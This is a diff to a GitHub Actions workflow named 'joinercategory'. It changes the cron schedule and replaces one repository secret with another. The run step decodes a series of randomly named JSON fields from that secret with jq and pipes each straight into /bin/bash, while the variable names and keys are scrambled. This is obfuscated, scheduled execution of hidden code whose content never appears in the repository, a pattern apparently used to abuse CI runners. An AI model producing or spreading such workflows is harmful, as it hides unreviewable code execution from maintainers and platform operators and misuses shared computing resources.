@@ -1,24 +1,29 @@
 name: joinercategory
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
-jobs:  # 30660
+    - cron: '22 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: joinercategory
         env:
-          t3706: ${{ secrets.t3706 }}
+          cx69: ${{ secrets.cx69 }}
         run: |
-          echo $t3706 | jq -r .vqxu09 | /bin/bash
-          echo $ztmw54 | jq -r .n19 | /bin/bash
-          echo $ihsym26506 | jq -r .fq050 | /bin/bash
-          echo $pduji7450 | jq -r .brjf1 | /bin/bash
-          echo $ls5114 | jq -r .pxq72 | /bin/bash
-          echo $ug7299 | jq -r .wpwy351 | /bin/bash
-          echo $gy76 | jq -r .ovldi7606 | /bin/bash
-          echo $aqt20761 | jq -r .r14 | /bin/bash
+          echo $cx69 | jq -r .x48 | /bin/bash
+          echo $il5 | jq -r .bx08 | /bin/bash
+          echo $s30245 | jq -r .z576 | /bin/bash
+          echo $ypr6 | jq -r .z99 | /bin/bash
+          echo $muiqx08679 | jq -r .foww508 | /bin/bash
+          echo $yjgcd83047 | jq -r .es54510 | /bin/bash
+          echo $kgyp0582 | jq -r .eyva24 | /bin/bash
+          echo $x465 | jq -r .xdb91 | /bin/bash
+          echo $x98036 | jq -r .iiad30 | /bin/bash
+          echo $zu7880 | jq -r .aiuv041 | /bin/bash
+          echo $tpu5 | jq -r .m328 | /bin/bash
+          echo $gpa06 | jq -r .xpveg1 | /bin/bash
+          echo $mp9 | jq -r .acnz5940 | /bin/bash
+          echo $aatry6 | jq -r .nk00 | /bin/bash
 
